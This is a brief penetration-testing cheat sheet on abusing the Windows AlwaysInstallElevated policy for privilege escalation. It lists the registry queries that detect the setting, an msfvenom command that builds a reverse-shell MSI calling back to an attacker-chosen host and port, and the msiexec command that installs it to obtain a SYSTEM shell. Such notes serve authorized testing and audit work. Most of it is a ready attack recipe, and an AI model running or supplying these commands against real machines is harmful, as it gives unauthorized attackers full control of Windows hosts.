# Always Install Elevated

Always Install Elevated is a registry / GPO setting that allows non privileged accounts to install Windows Package Installer (MSI) files with SYSTEM permissions. Usually this is used in environments to reduce workload for Helpdesk staff for when users require software to be installed.

## TIP: winPEAS also enumerates this attack vector

### 1) Query registry keys

##### Value 0x1 represents AlwaysInstallElevated as being enabled.

    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

### 2) Create a malicious .msi file and transfer it on the attacking machine

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f msi -o Application.msi

### 3) Manually try to install the .msi file

    msiexec /i "path\Application.msi"

### 4) Got a shell as SYSTEM.
